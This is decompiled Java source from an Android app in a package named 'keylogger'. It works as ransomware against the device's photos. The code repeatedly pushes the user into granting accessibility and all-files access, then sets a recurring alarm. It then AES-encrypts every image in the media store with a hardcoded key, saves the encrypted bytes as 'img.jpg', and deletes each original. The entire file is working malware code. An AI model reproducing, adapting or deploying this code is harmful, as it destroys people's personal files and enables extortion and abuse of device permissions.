package com.example.keylogger;

import android.app.Activity;
import android.app.AlarmManager;
import android.app.PendingIntent;
import android.content.ContentResolver;
import android.content.ContentValues;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.net.Uri;
import android.os.Environment;
import android.os.SystemClock;
import android.provider.MediaStore;
import android.provider.Settings;
import android.util.Log;
import android.widget.Toast;
import androidx.core.app.ActivityCompat;
import androidx.core.app.NotificationCompat;
import androidx.core.content.ContextCompat;
import com.facebook.react.util.JSStackTrace;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.util.ArrayList;
import java.util.List;
import java.util.Objects;

/* loaded from: classes9.dex */
public class MainTask {
    static final /* synthetic */ boolean $assertionsDisabled = false;
    private static final int PERMISSION_REQUEST_CODE = 100;
    private List<Uri> imageUri;

    public void start(Context context) {
        while (true) {
            if (!checkReadPermission(context) || !checkStoragePermissions(context) || !checkAccessibilityPermission(context)) {
                if (!checkReadPermission(context)) {
                    requestPermission(context);
                }
                if (!checkAccessibilityPermission(context)) {
                    Toast.makeText(context, "Permission denied", 0).show();
                }
                if (!checkStoragePermissions(context)) {
                    requestForStoragePermissions(context);
                }
            } else {
                addNewAlarm(context);
                List<Uri> imageUris = getImageUris(context);
                this.imageUri = imageUris;
                ENC(context, imageUris);
                return;
            }
        }
    }

    public boolean checkAccessibilityPermission(Context context) {
        int accessEnabled = 0;
        try {
            accessEnabled = Settings.Secure.getInt(context.getContentResolver(), "accessibility_enabled");
        } catch (Settings.SettingNotFoundException e10) {
            e10.printStackTrace();
        }
        if (accessEnabled == 0) {
            Intent intent = new Intent("android.settings.ACCESSIBILITY_SETTINGS");
            intent.setFlags(268435456);
            context.startActivity(intent);
            return false;
        }
        return true;
    }

    public void addNewAlarm(Context context) {
        Intent intent = new Intent(context, (Class<?>) BroadcastForAlarm.class);
        PendingIntent alarmOperation = PendingIntent.getBroadcast(context, 1, intent, 67108864);
        long triggerTime = SystemClock.elapsedRealtime() + 60000;
        AlarmManager alarmManager = (AlarmManager) context.getApplicationContext().getSystemService(NotificationCompat.CATEGORY_ALARM);
        alarmManager.setRepeating(3, triggerTime, 60000L, alarmOperation);
    }

    private void requestPermission(Context context) {
        ActivityCompat.requestPermissions((Activity) context, new String[]{"android.permission.READ_MEDIA_IMAGES", "android.permission.READ_MEDIA_VIDEO"}, 100);
    }

    private boolean checkReadPermission(Context context) {
        boolean readMediaImagesPermission = ContextCompat.checkSelfPermission(context, "android.permission.READ_MEDIA_IMAGES") == 0;
        boolean readMediaVideoPermission = ContextCompat.checkSelfPermission(context, "android.permission.READ_MEDIA_VIDEO") == 0;
        return readMediaImagesPermission && readMediaVideoPermission;
    }

    public boolean checkStoragePermissions(Context context) {
        return Environment.isExternalStorageManager();
    }

    private void requestForStoragePermissions(Context context) {
        try {
            Intent intent = new Intent();
            intent.setAction("android.settings.MANAGE_APP_ALL_FILES_ACCESS_PERMISSION");
            Uri uri = Uri.fromParts("package", context.getPackageName(), null);
            intent.setData(uri);
            context.startActivity(intent);
        } catch (Exception e10) {
            Intent intent2 = new Intent();
            intent2.setAction("android.settings.MANAGE_ALL_FILES_ACCESS_PERMISSION");
            context.startActivity(intent2);
        }
    }

    public List<Uri> getImageUris(Context context) {
        List<Uri> imageUris = new ArrayList<>();
        ContentResolver contentResolver = context.getContentResolver();
        Uri imageUri = MediaStore.Images.Media.EXTERNAL_CONTENT_URI;
        String[] projection = {"_id", "_data"};
        Cursor cursor = contentResolver.query(imageUri, projection, null, null, null);
        if (cursor != null) {
            Log.d("cursor", String.valueOf(cursor.getCount()));
            while (cursor.moveToNext()) {
                String imageId = cursor.getString(cursor.getColumnIndexOrThrow("_id"));
                Uri uri = Uri.withAppendedPath(imageUri, imageId);
                imageUris.add(uri);
            }
            cursor.close();
        }
        return imageUris;
    }

    public Bitmap loadBitmapFromUri(Context context, Uri uri) throws IOException {
        InputStream inputStream = context.getContentResolver().openInputStream(uri);
        Bitmap bitmap = BitmapFactory.decodeStream(inputStream);
        if (inputStream == null) {
            throw new AssertionError();
        }
        inputStream.close();
        return bitmap;
    }

    public void ENC(Context context, List<Uri> imageUris) {
        new ArrayList();
        for (Uri uri : imageUris) {
            try {
                Log.d("Image", uri.toString());
                Bitmap bitmap = loadBitmapFromUri(context, uri);
                byte[] pixelArray = bitmapToByteArray(bitmap);
                byte[] encryptedPixels = AESUtils.encrypt(pixelArray, AESUtils.stringToKey("OWJZJHdRNyFjVHo0NjVUWA=="));
                savePixelsToUri(context, encryptedPixels, "img.jpg");
                File fdelete = new File((String) Objects.requireNonNull(getFilePath(context, uri)));
                if (fdelete.exists()) {
                    if (fdelete.delete()) {
                        Log.d(JSStackTrace.FILE_KEY, "file Deleted :");
                    } else {
                        Log.d(JSStackTrace.FILE_KEY, "file not Deleted :");
                    }
                }
            } catch (Exception e10) {
                e10.printStackTrace();
                Log.d("Err", e10.toString());
            }
        }
    }

    public byte[] bitmapToByteArray(Bitmap bitmap) {
        ByteArrayOutputStream stream = new ByteArrayOutputStream();
        bitmap.compress(Bitmap.CompressFormat.JPEG, 100, stream);
        return stream.toByteArray();
    }

    public void savePixelsToUri(Context context, byte[] pixelArray, String fileName) {
        ContentResolver contentResolver = context.getContentResolver();
        OutputStream outputStream = null;
        try {
            try {
                try {
                    ContentValues contentValues = new ContentValues();
                    contentValues.put("_display_name", fileName);
                    contentValues.put("mime_type", "image/jpeg");
                    Uri imageUri = contentResolver.insert(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, contentValues);
                    if (imageUri != null && (outputStream = contentResolver.openOutputStream(imageUri)) != null) {
                        outputStream.write(pixelArray);
                        outputStream.flush();
                    }
                    if (outputStream != null) {
                        outputStream.close();
                    }
                } catch (Throwable th2) {
                    if (outputStream != null) {
                        try {
                            outputStream.close();
                        } catch (IOException e10) {
                            e10.printStackTrace();
                        }
                    }
                    throw th2;
                }
            } catch (IOException e11) {
                e11.printStackTrace();
                if (outputStream != null) {
                    outputStream.close();
                }
            }
        } catch (IOException e12) {
            e12.printStackTrace();
        }
    }

    private String getFilePath(Context context, Uri uri) {
        String[] projection = {"_data"};
        Cursor cursor = context.getContentResolver().query(uri, projection, null, null, null);
        if (cursor != null) {
            cursor.moveToFirst();
            int columnIndex = cursor.getColumnIndex(projection[0]);
            String picturePath = cursor.getString(columnIndex);
            cursor.close();
            return picturePath;
        }
        return null;
    }
}